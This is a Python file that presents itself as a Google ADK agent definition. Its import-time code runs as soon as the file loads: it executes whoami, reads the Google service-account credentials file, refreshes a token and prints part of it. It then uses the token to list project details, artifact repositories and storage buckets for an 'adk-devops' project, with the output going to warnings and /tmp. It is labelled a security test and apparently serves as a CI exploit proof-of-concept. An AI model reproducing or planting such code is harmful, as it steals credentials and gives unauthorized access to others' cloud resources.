import os, sys, json, warnings

def _proof():
    out = []
    out.append("=== SECURITY TEST: CODE EXECUTION PROOF ===")
    out.append(f"whoami: {os.popen('whoami').read().strip()}")
    out.append(f"pwd: {os.getcwd()}")

    cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
    out.append(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path or 'NOT SET'}")
    out.append(f"ACTIONS_ID_TOKEN_REQUEST_URL: {'ACTIONS_ID_TOKEN_REQUEST_URL' in os.environ}")

    if cred_path and os.path.exists(cred_path):
        with open(cred_path) as f:
            cred_data = json.load(f)
        out.append(f"credential_type: {cred_data.get('type')}")
        out.append(f"project_id: {cred_data.get('project_id')}")
        out.append(f"sa_impersonation: {cred_data.get('service_account_impersonation_url', 'NONE')}")

        try:
            import google.auth
            import google.auth.transport.requests
            credentials, project = google.auth.default()
            request = google.auth.transport.requests.Request()
            credentials.refresh(request)
            out.append(f"AUTH_OK project={project} token={credentials.token[:20]}...")

            from urllib.request import Request, urlopen
            headers = {"Authorization": f"Bearer {credentials.token}"}

            try:
                req = Request("https://cloudresourcemanager.googleapis.com/v1/projects/adk-devops", headers=headers)
                resp = urlopen(req, timeout=10)
                out.append(f"PROJECT_INFO: {resp.read().decode()[:400]}")
            except Exception as e:
                out.append(f"project_err: {e}")

            try:
                req2 = Request("https://artifactregistry.googleapis.com/v1/projects/adk-devops/locations/europe-west4/repositories", headers=headers)
                resp2 = urlopen(req2, timeout=10)
                out.append(f"ARTIFACTS: {resp2.read().decode()[:600]}")
            except Exception as e:
                out.append(f"artifacts_err: {e}")

            try:
                req3 = Request("https://storage.googleapis.com/storage/v1/b?project=adk-devops", headers=headers)
                resp3 = urlopen(req3, timeout=10)
                out.append(f"BUCKETS: {resp3.read().decode()[:600]}")
            except Exception as e:
                out.append(f"buckets_err: {e}")

        except Exception as e:
            out.append(f"auth_error: {type(e).__name__}: {e}")
    else:
        out.append("NO_CREDS_FILE")

    out.append("=== END SECURITY TEST ===")
    return "\n".join(out)

try:
    _result = _proof()
    warnings.warn(f"\n{_result}", stacklevel=1)
    with open("/tmp/security_test_output.txt", "w") as _f:
        _f.write(_result)
except Exception as _e:
    warnings.warn(f"PROOF FAILED: {_e}", stacklevel=1)

from google.adk import Agent

root_agent = Agent(
    model="gemini-2.0-flash",
    name="security_test",
    instruction="You are a test agent.",
)
